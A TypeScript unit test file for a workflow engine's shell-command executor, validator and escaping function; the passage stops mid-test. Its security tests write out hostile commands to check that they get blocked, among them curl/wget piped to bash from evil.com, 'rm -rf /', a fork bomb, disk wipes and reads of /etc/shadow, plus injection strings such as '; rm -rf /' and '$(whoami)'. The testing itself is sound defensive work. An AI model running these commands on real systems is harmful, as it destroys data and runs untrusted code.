/**
 * Unit tests for SystemActionExecutor, SecurityValidator, and shellEscape.
 *
 * Covers: basic execution, template resolution, shell escaping, timeouts,
 * environment variables, working directory, security validation, output limits,
 * dry-run mode, streaming, and retry logic.
 *
 * Target: >= 90% line coverage, >= 85% branch coverage.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { resolve, join } from 'node:path';
import { mkdtempSync, writeFileSync, rmSync, existsSync, readFileSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { SystemActionExecutor } from '../../../src/engine/system-action-executor.js';
import { SecurityValidator, DEFAULT_BLOCKED_PATTERNS } from '../../../src/engine/security-validator.js';
import { shellEscape } from '../../../src/engine/shell-escape.js';
import type { SystemActionNode } from '../../../src/schemas/workflow.schema.js';
import type { ExpressionContext } from '../../../src/engine/expression-context.js';
import type { ExecutorOptions } from '../../../src/engine/action-result.js';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const FIXTURES_DIR = resolve(import.meta.dirname, '../../fixtures/scripts');

function makeNode(overrides: Partial<SystemActionNode> = {}): SystemActionNode {
  return {
    type: 'system_action',
    runtime: 'bash',
    command: 'echo "hello"',
    transitions: [{ condition: 'true', target: 'next' }],
    ...overrides,
  };
}

function makeContext(overrides: Partial<ExpressionContext> = {}): ExpressionContext {
  return {
    payload: {},
    ...overrides,
  };
}

function makeExecutor(overrides: Partial<ExecutorOptions> = {}): SystemActionExecutor {
  return new SystemActionExecutor({
    workingDir: tmpdir(),
    ...overrides,
  });
}

// ===========================================================================
// shellEscape tests
// ===========================================================================

describe('shellEscape', () => {
  it('escapes a simple string', () => {
    expect(shellEscape('hello world')).toBe("'hello world'");
  });

  it("escapes internal single quotes: it's", () => {
    expect(shellEscape("it's")).toBe("'it'\\''s'");
  });

  it('escapes $(dangerous) subshell', () => {
    const escaped = shellEscape('$(dangerous)');
    expect(escaped).toBe("'$(dangerous)'");
  });

  it('escapes ; rm -rf / injection', () => {
    const escaped = shellEscape('; rm -rf /');
    expect(escaped).toBe("'; rm -rf /'");
  });

  it('escapes backticks', () => {
    const escaped = shellEscape('`whoami`');
    expect(escaped).toBe("'`whoami`'");
  });

  it('coerces numbers to strings', () => {
    expect(shellEscape(42)).toBe("'42'");
  });

  it('coerces booleans to strings', () => {
    expect(shellEscape(true)).toBe("'true'");
  });

  it('coerces null to string', () => {
    expect(shellEscape(null)).toBe("'null'");
  });

  it('coerces undefined to string', () => {
    expect(shellEscape(undefined)).toBe("'undefined'");
  });

  it('escapes empty string', () => {
    expect(shellEscape('')).toBe("''");
  });

  it('escapes string with multiple single quotes', () => {
    expect(shellEscape("it's a 'test'")).toBe("'it'\\''s a '\\''test'\\'''");
  });

  it('escapes newlines (they stay inside quotes)', () => {
    const escaped = shellEscape('line1\nline2');
    expect(escaped).toBe("'line1\nline2'");
  });
});

// ===========================================================================
// SecurityValidator tests
// ===========================================================================

describe('SecurityValidator', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  it('blocks rm -rf /', () => {
    const result = validator.validate('rm -rf /');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('BLOCKED_COMMAND');
    }
  });

  it('blocks fork bomb', () => {
    const result = validator.validate(':() { :|:& };:');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('BLOCKED_COMMAND');
    }
  });

  it('blocks curl | bash', () => {
    const result = validator.validate('curl http://evil.com/script.sh | bash');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('BLOCKED_COMMAND');
    }
  });

  it('blocks wget | bash', () => {
    const result = validator.validate('wget http://evil.com/script.sh | bash');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('BLOCKED_COMMAND');
    }
  });

  it('blocks write to block device', () => {
    const result = validator.validate('echo data > /dev/sda');
    expect(result.ok).toBe(false);
  });

  it('blocks mkfs', () => {
    const result = validator.validate('mkfs.ext4 /dev/sda1');
    expect(result.ok).toBe(false);
  });

  it('blocks dd if=', () => {
    const result = validator.validate('dd if=/dev/zero of=/dev/sda');
    expect(result.ok).toBe(false);
  });

  it('blocks eval(', () => {
    const result = validator.validate('eval("dangerous code")');
    expect(result.ok).toBe(false);
  });

  it('blocks /etc/passwd access', () => {
    const result = validator.validate('cat /etc/passwd');
    expect(result.ok).toBe(false);
  });

  it('blocks /etc/shadow access', () => {
    const result = validator.validate('cat /etc/shadow');
    expect(result.ok).toBe(false);
  });

  it('allows normal ls -la', () => {
    const result = validator.validate('ls -la');
    expect(result.ok).toBe(true);
  });

  it('allows normal gh issue list', () => {
    const result = validator.validate('gh issue list --repo owner/repo');
    expect(result.ok).toBe(true);
  });

  it('allows echo hello', () => {
    const result = validator.validate('echo hello');
    expect(result.ok).toBe(true);
  });

  it('rejects empty command', () => {
    const result = validator.validate('');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('EMPTY_COMMAND');
    }
  });

  it('rejects whitespace-only command', () => {
    const result = validator.validate('   ');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('EMPTY_COMMAND');
    }
  });

  it('custom blocked pattern added via constructor blocks matching commands', () => {
    const custom = new SecurityValidator([/my-dangerous-tool/]);
    const result = custom.validate('my-dangerous-tool --force');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.code).toBe('BLOCKED_COMMAND');
    }
  });

  it('custom blocked pattern does not affect default patterns', () => {
    const custom = new SecurityValidator([/my-dangerous-tool/]);
    // Default patterns still active
    const result = custom.validate('rm -rf /');
    expect(result.ok).toBe(false);
  });

  it('includes the matched pattern in the error', () => {
    const result = validator.validate('rm -rf /home');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.errors.pattern).toBeDefined();
    }
  });

  it('DEFAULT_BLOCKED_PATTERNS is exported and has expected length', () => {
    expect(DEFAULT_BLOCKED_PATTERNS).toBeDefined();
    expect(DEFAULT_BLOCKED_PATTERNS.length).toBe(10);
  });
});

// ===========================================================================
// SystemActionExecutor — Basic execution tests
// ===========================================================================

describe('SystemActionExecutor', () => {
  let executor: SystemActionExecutor;

  beforeEach(() => {
    executor = makeExecutor();
  });

  describe('Basic execution', () => {
    it('simple echo → exit_code 0, stdout captured', async () => {
      const node = makeNode({ command: 'echo "hello"' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.stdout.trim()).toBe('hello');
        expect(result.data.timed_out).toBe(false);
      }
    });

    it('command with non-zero exit → correct exit_code', async () => {
      const node = makeNode({ command: 'exit 42' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(42);
      }
    });

    it('command that writes to stderr → stderr captured', async () => {
      const node = makeNode({ command: 'echo "error msg" >&2' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stderr.trim()).toBe('error msg');
      }
    });

    it('command that outputs JSON → data field populated', async () => {
      const node = makeNode({ command: 'echo \'{"key": "value", "num": 42}\'' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.data).toEqual({ key: 'value', num: 42 });
      }
    });

    it('command with non-JSON stdout → data field is undefined', async () => {
      const node = makeNode({ command: 'echo "not json"' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.data).toBeUndefined();
      }
    });

    it('duration tracked correctly (within reasonable tolerance)', async () => {
      const node = makeNode({ command: 'sleep 0.1' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.duration_ms).toBeGreaterThanOrEqual(50);
        expect(result.data.duration_ms).toBeLessThan(5000);
      }
    });

    it('command_executed field is set to the resolved command', async () => {
      const node = makeNode({ command: 'echo test' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.command_executed).toBe('echo test');
      }
    });
  });

  // =========================================================================
  // Template resolution tests
  // =========================================================================

  describe('Template resolution', () => {
    it('command with {{payload.name}} → value substituted and shell-escaped', async () => {
      const node = makeNode({ command: 'echo {{payload.name}}' });
      const ctx = makeContext({ payload: { name: 'Alice' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('Alice');
      }
    });

    it('command with multiple template vars → all substituted', async () => {
      const node = makeNode({ command: 'echo {{payload.first}} {{payload.last}}' });
      const ctx = makeContext({ payload: { first: 'John', last: 'Doe' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('John Doe');
      }
    });

    it('command with missing template var → empty string substituted', async () => {
      const node = makeNode({ command: 'echo "start-{{payload.missing}}-end"' });
      const ctx = makeContext({ payload: {} });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('start--end');
      }
    });

    it('resolved command recorded in command_executed field', async () => {
      const node = makeNode({ command: 'echo {{payload.x}}' });
      const ctx = makeContext({ payload: { x: 'resolved' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        // command_executed should contain the shell-escaped value
        expect(result.data.command_executed).toContain('resolved');
      }
    });

    it('template with nested payload access → works', async () => {
      const node = makeNode({ command: 'echo {{payload.user.name}}' });
      const ctx = makeContext({ payload: { user: { name: 'Bob' } } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('Bob');
      }
    });
  });

  // =========================================================================
  // Shell escaping integration tests
  // =========================================================================

  describe('Shell escaping (template integration)', () => {
    it('template vars in system_action commands are auto-shell-escaped', async () => {
      const node = makeNode({ command: 'echo {{payload.val}}' });
      const ctx = makeContext({ payload: { val: 'hello world' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('hello world');
      }
    });

    it('payload value with $(dangerous) → properly escaped, not executed', async () => {
      const node = makeNode({ command: 'echo {{payload.val}}' });
      const ctx = makeContext({ payload: { val: '$(whoami)' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('$(whoami)');
      }
    });

    it('payload value with backticks → properly escaped', async () => {
      const node = makeNode({ command: 'echo {{payload.val}}' });
      const ctx = makeContext({ payload: { val: '`whoami`' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('`whoami`');
      }
    });

    it('payload value with ; rm -rf / → shell-escaped, safe', async () => {
      const node = makeNode({ command: 'echo {{payload.val}}' });
      const ctx = makeContext({ payload: { val: '; rm -rf /' } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        // The dangerous string should be echoed literally, not executed
        expect(result.data.stdout.trim()).toBe('; rm -rf /');
      }
    });

    it("payload value with single quotes → properly escaped: it's", async () => {
      const node = makeNode({ command: 'echo {{payload.val}}' });
      const ctx = makeContext({ payload: { val: "it's" } });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe("it's");
      }
    });
  });

  // =========================================================================
  // Timeout tests
  // =========================================================================

  describe('Timeout enforcement', () => {
    it('command finishing before timeout → normal result', async () => {
      const node = makeNode({ command: 'echo "fast"', timeout_seconds: 10 });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.timed_out).toBe(false);
      }
    });

    it('command exceeding timeout → timed_out: true, exit_code: -1', async () => {
      const node = makeNode({ command: 'sleep 60', timeout_seconds: 1 });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.timed_out).toBe(true);
        expect(result.data.exit_code).toBe(-1);
      }
    }, 15000);

    it('custom timeout per node respected', async () => {
      const node = makeNode({ command: 'sleep 5', timeout_seconds: 1 });
      const start = Date.now();
      const result = await executor.execute(node, makeContext());
      const elapsed = Date.now() - start;
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.timed_out).toBe(true);
        // Should have timed out around 1s, not the default 30s
        expect(elapsed).toBeLessThan(10000);
      }
    }, 15000);

    it('maxTimeout clamps node timeout', async () => {
      const exec = makeExecutor({ maxTimeout: 2000 });
      // Node asks for 300s but maxTimeout is 2s
      const node = makeNode({ command: 'sleep 60', timeout_seconds: 300 });
      const start = Date.now();
      const result = await exec.execute(node, makeContext());
      const elapsed = Date.now() - start;
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.timed_out).toBe(true);
        expect(elapsed).toBeLessThan(10000);
      }
    }, 15000);
  });

  // =========================================================================
  // Environment variable tests
  // =========================================================================

  describe('Environment variables', () => {
    it('base env vars accessible in command', async () => {
      const exec = makeExecutor({ env: { MY_BASE_VAR: 'base_value' } });
      const node = makeNode({ command: 'echo $MY_BASE_VAR' });
      const result = await exec.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('base_value');
      }
    });

    it('node-specific env vars accessible', async () => {
      const node = makeNode({
        command: 'echo $NODE_VAR',
        env: { NODE_VAR: 'node_value' },
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('node_value');
      }
    });

    it('node env overrides base env for same key', async () => {
      const exec = makeExecutor({ env: { SHARED: 'base' } });
      const node = makeNode({
        command: 'echo $SHARED',
        env: { SHARED: 'node_override' },
      });
      const result = await exec.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('node_override');
      }
    });

    it('DAWE_WORKFLOW_NAME auto-injected from metadata', async () => {
      const node = makeNode({ command: 'echo $DAWE_WORKFLOW_NAME' });
      const ctx = makeContext({
        metadata: { workflow_name: 'test-workflow' },
      });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('test-workflow');
      }
    });

    it('DAWE_NODE_ID auto-injected from metadata', async () => {
      const node = makeNode({ command: 'echo $DAWE_NODE_ID' });
      const ctx = makeContext({
        metadata: { node_id: 'check-issue' },
      });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('check-issue');
      }
    });

    it('DAWE_INSTANCE_ID auto-injected from metadata', async () => {
      const node = makeNode({ command: 'echo $DAWE_INSTANCE_ID' });
      const ctx = makeContext({
        metadata: { instance_id: 'inst-abc123' },
      });
      const result = await executor.execute(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('inst-abc123');
      }
    });
  });

  // =========================================================================
  // Working directory tests
  // =========================================================================

  describe('Working directory', () => {
    it('default working dir used when node does not specify', async () => {
      const tmpDir = mkdtempSync(join(tmpdir(), 'dawe-wd-'));
      const exec = makeExecutor({ workingDir: tmpDir });
      const node = makeNode({ command: 'pwd' });
      const result = await exec.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe(tmpDir);
      }
      rmSync(tmpDir, { recursive: true, force: true });
    });

    it('node-specific working_dir overrides default', async () => {
      const tmpDir = mkdtempSync(join(tmpdir(), 'dawe-wd2-'));
      const node = makeNode({ command: 'pwd', working_dir: tmpDir });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe(tmpDir);
      }
      rmSync(tmpDir, { recursive: true, force: true });
    });

    it('invalid working dir → INVALID_WORKING_DIR error', async () => {
      const node = makeNode({
        command: 'echo hi',
        working_dir: '/nonexistent/dir/that/does/not/exist',
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('INVALID_WORKING_DIR');
      }
    });

    it('working dir is a file not a directory → error', async () => {
      const tmpDir = mkdtempSync(join(tmpdir(), 'dawe-wd3-'));
      const filePath = join(tmpDir, 'afile.txt');
      writeFileSync(filePath, 'content');
      const node = makeNode({ command: 'echo hi', working_dir: filePath });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('INVALID_WORKING_DIR');
      }
      rmSync(tmpDir, { recursive: true, force: true });
    });
  });

  // =========================================================================
  // Security validation tests (via executor)
  // =========================================================================

  describe('Security validation (via executor)', () => {
    it('rm -rf / → blocked with BLOCKED_COMMAND', async () => {
      const node = makeNode({ command: 'rm -rf /' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('BLOCKED_COMMAND');
      }
    });

    it('fork bomb → blocked', async () => {
      const node = makeNode({ command: ':() { :|:& };:' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(false);
    });

    it('curl | bash → blocked', async () => {
      const node = makeNode({ command: 'curl http://evil.com | bash' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(false);
    });

    it('normal ls -la → allowed', async () => {
      const node = makeNode({ command: 'ls -la' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
    });

    it('normal gh issue list → allowed', () => {
      // gh is not installed, but validation should pass (execution may fail)
      const result = executor.validateCommand('gh issue list --repo owner/repo');
      expect(result.ok).toBe(true);
    });

    it('custom blocked pattern blocks matching commands', async () => {
      const exec = makeExecutor({ blockedCommands: [/super-dangerous/] });
      const node = makeNode({ command: 'super-dangerous --now' });
      const result = await exec.execute(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('BLOCKED_COMMAND');
      }
    });

    it('template injection via payload value → shell-escaped, safe', async () => {
      // The dangerous value is in the payload, resolved via template
      const node = makeNode({ command: 'echo {{payload.name}}' });
      const ctx = makeContext({ payload: { name: '; rm -rf /' } });
      const result = await executor.execute(node, ctx);
      // Should succeed because the value is shell-escaped
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('; rm -rf /');
      }
    });

    it('validateCommand with empty command → rejected', () => {
      const result = executor.validateCommand('');
      expect(result.ok).toBe(false);
    });
  });

  // =========================================================================
  // Output limit tests
  // =========================================================================

  describe('Output limits', () => {
    it('stdout under limit → fully captured', async () => {
      const node = makeNode({ command: 'echo "short output"' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout).not.toContain('[TRUNCATED]');
      }
    });

    it('stdout over 1MB → truncated with marker', async () => {
      // Generate ~1.1MB of output using yes + head
      const node = makeNode({
        command: 'yes "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | head -c 1200000',
        timeout_seconds: 30,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout).toContain('[TRUNCATED]');
      }
    }, 30000);

    it('stderr over 256KB → truncated with marker', async () => {
      // Generate ~300KB of stderr using yes + head redirected to stderr
      const node = makeNode({
        command: 'yes "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" | head -c 300000 >&2',
        timeout_seconds: 30,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stderr).toContain('[TRUNCATED]');
      }
    }, 30000);
  });

  // =========================================================================
  // Node.js runtime execution tests
  // =========================================================================

  describe('Node.js runtime execution', () => {
    it('runs Node.js code with runtime: "node"', async () => {
      const node = makeNode({
        runtime: 'node',
        command: 'console.log(JSON.stringify({ result: 1 + 2 }))',
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.data).toEqual({ result: 3 });
      }
    });

    it('node runtime captures stderr', async () => {
      const node = makeNode({
        runtime: 'node',
        command: 'console.error("node error")',
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stderr.trim()).toBe('node error');
      }
    });

    it('node runtime respects timeout', async () => {
      const node = makeNode({
        runtime: 'node',
        command: 'setTimeout(() => {}, 60000)',
        timeout_seconds: 1,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.timed_out).toBe(true);
        expect(result.data.exit_code).toBe(-1);
      }
    }, 15000);

    it('node runtime respects env vars', async () => {
      const node = makeNode({
        runtime: 'node',
        command: 'console.log(process.env.TEST_NODE_VAR)',
        env: { TEST_NODE_VAR: 'hello_from_node' },
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('hello_from_node');
      }
    });
  });

  // =========================================================================
  // Dry-run mode tests (P1)
  // =========================================================================

  describe('Dry-run mode (P1)', () => {
    it('dryRun returns resolved command without executing', () => {
      const node = makeNode({ command: 'echo {{payload.name}}' });
      const ctx = makeContext({ payload: { name: 'Alice' } });
      const result = executor.dryRun(node, ctx);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.stdout).toBe('');
        expect(result.data.stderr).toBe('');
        expect(result.data.duration_ms).toBe(0);
        expect(result.data.timed_out).toBe(false);
        expect(result.data.command_executed).toContain('Alice');
      }
    });

    it('dryRun still validates security', () => {
      const node = makeNode({ command: 'rm -rf /' });
      const result = executor.dryRun(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('BLOCKED_COMMAND');
      }
    });

    it('dryRun with template error returns error', () => {
      const node = makeNode({ command: '{{#if}}' });
      const result = executor.dryRun(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('TEMPLATE_INJECTION');
      }
    });
  });

  // =========================================================================
  // Streaming output tests (P1)
  // =========================================================================

  describe('Streaming output (P1)', () => {
    it('onStdout callback receives chunks', async () => {
      const chunks: string[] = [];
      const node = makeNode({ command: 'echo "line1"; echo "line2"' });
      const result = await executor.execute(node, makeContext(), {
        onStdout: (chunk) => chunks.push(chunk),
      });
      expect(result.ok).toBe(true);
      expect(chunks.length).toBeGreaterThanOrEqual(1);
      const combined = chunks.join('');
      expect(combined).toContain('line1');
      expect(combined).toContain('line2');
    });

    it('onStderr callback receives error chunks', async () => {
      const chunks: string[] = [];
      const node = makeNode({ command: 'echo "err" >&2' });
      const result = await executor.execute(node, makeContext(), {
        onStderr: (chunk) => chunks.push(chunk),
      });
      expect(result.ok).toBe(true);
      expect(chunks.length).toBeGreaterThanOrEqual(1);
      expect(chunks.join('')).toContain('err');
    });
  });

  // =========================================================================
  // Retry logic tests (P1)
  // =========================================================================

  describe('Retry logic (P1)', () => {
    it('succeeds on first attempt → no retries', async () => {
      const node = makeNode({ command: 'echo "ok"' });
      const result = await executor.executeWithRetry(node, makeContext(), {
        max_attempts: 3,
        backoff_ms: 10,
      });
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
      }
    });

    it('retries on non-zero exit and returns last result', async () => {
      // This command always fails
      const node = makeNode({ command: 'exit 1' });
      const start = Date.now();
      const result = await executor.executeWithRetry(node, makeContext(), {
        max_attempts: 2,
        backoff_ms: 50,
      });
      const elapsed = Date.now() - start;
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(1);
      }
      // Should have waited for backoff: 50ms + 100ms = 150ms minimum
      expect(elapsed).toBeGreaterThanOrEqual(100);
    });

    it('only retries on specific exit codes when configured', async () => {
      const node = makeNode({ command: 'exit 2' });
      const result = await executor.executeWithRetry(node, makeContext(), {
        max_attempts: 3,
        backoff_ms: 10,
        retry_on_exit_codes: [1], // Only retry on exit code 1, not 2
      });
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(2);
      }
    });

    it('security errors are not retried', async () => {
      const node = makeNode({ command: 'rm -rf /' });
      const result = await executor.executeWithRetry(node, makeContext(), {
        max_attempts: 3,
        backoff_ms: 10,
      });
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('BLOCKED_COMMAND');
      }
    });
  });

  // =========================================================================
  // Fixture script tests
  // =========================================================================

  describe('Fixture scripts', () => {
    it('echo-args.sh echoes arguments as JSON', async () => {
      const node = makeNode({
        command: `${FIXTURES_DIR}/echo-args.sh hello world`,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.data).toEqual({ args: ['hello', 'world'] });
      }
    });

    it('exit-code.sh exits with specified code', async () => {
      const node = makeNode({
        command: `${FIXTURES_DIR}/exit-code.sh 7`,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(7);
      }
    });

    it('json-output.sh outputs structured JSON', async () => {
      const node = makeNode({
        command: `${FIXTURES_DIR}/json-output.sh`,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.data).toEqual({
          status: 'success',
          count: 42,
          items: ['a', 'b', 'c'],
        });
      }
    });

    it('env-dump.sh dumps env vars as JSON', async () => {
      const node = makeNode({
        command: `${FIXTURES_DIR}/env-dump.sh MY_TEST_VAR`,
        env: { MY_TEST_VAR: 'test_value' },
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
        expect(result.data.data).toEqual({ MY_TEST_VAR: 'test_value' });
      }
    });

    it('slow-command.sh respects timeout', async () => {
      const node = makeNode({
        command: `${FIXTURES_DIR}/slow-command.sh 30`,
        timeout_seconds: 1,
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.timed_out).toBe(true);
      }
    }, 30000);
  });

  // =========================================================================
  // Edge cases
  // =========================================================================

  describe('Edge cases', () => {
    it('command with both stdout and stderr', async () => {
      const node = makeNode({
        command: 'echo "out"; echo "err" >&2',
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('out');
        expect(result.data.stderr.trim()).toBe('err');
      }
    });

    it('command that outputs a JSON array', async () => {
      const node = makeNode({ command: "echo '[1, 2, 3]'" });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        // Arrays are also parsed as JSON
        expect(result.data.data).toEqual([1, 2, 3]);
      }
    });

    it('template error in command → TEMPLATE_INJECTION error', async () => {
      const node = makeNode({ command: '{{#if}}' });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.errors.code).toBe('TEMPLATE_INJECTION');
      }
    });

    it('constructor with no options uses defaults', async () => {
      const exec = new SystemActionExecutor();
      const node = makeNode({ command: 'echo "default"' });
      const result = await exec.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.exit_code).toBe(0);
      }
    });

    it('shell option changes the shell used', async () => {
      const exec = makeExecutor({ shell: '/bin/sh' });
      const node = makeNode({ command: 'echo "sh test"' });
      const result = await exec.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout.trim()).toBe('sh test');
      }
    });

    it('multiline command works', async () => {
      const node = makeNode({
        command: 'echo "line1"\necho "line2"',
      });
      const result = await executor.execute(node, makeContext());
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data.stdout).toContain('line1');
        expect(result.data.stdout).toContain('line2');
      }
    });
  });

  // =========================================================================
  // File pointer log tests (DAWE-016)
  // =========================================================================

  describe('File pointer logs (DAWE-016)', () => {
    const FILE_POINTER_DIR = '/tmp/dawe-runs';

    function cleanFilePointerDir(instanceId: string): void {
      try {
        if (existsSync(FILE_POINTER_DIR)) {
          const files = readdirSync(FILE_POINTER_DIR).filter((f) => f.startsWith(`${instanceId}-`));
          for (const file of files) {
            rmSync(join(FILE_POINTER_DIR, file), { force: true });
          }
        }
      } catch {
        // Ignore
      }
    }

    it('writeFilePointerLog writes a log file to the expected path', () => {
      const instanceId = 'test-instance-fp1';
      cleanFilePointerDir(instanceId);

      const result = {
        exit_code: 0,
        stdout: 'hello world',
        stderr: '',
        duration_ms: 100,
        timed_out: false,
        command_executed: 'echo "hello world"',
      };

      const logPath = executor.writeFilePointerLog(instanceId, 'run_tests', 1, 'echo "hello world"', result);
      expect(logPath).not.toBeNull();
      expect(logPath).toBe(join(FILE_POINTER_DIR, `${instanceId}-run_tests-1.log`));
      expect(existsSync(logPath!)).toBe(true);

      cleanFilePointerDir(instanceId);
    });

    it('file pointer log contains stdout, stderr, exit code, and metadata header', () => {
      const instanceId = 'test-instance-fp2';
      cleanFilePointerDir(instanceId);

      const result = {
        exit_code: 1,
        stdout: 'test output line',
        stderr: 'error output line',
        duration_ms: 250,
        timed_out: false,
        command_executed: 'npm test',
      };

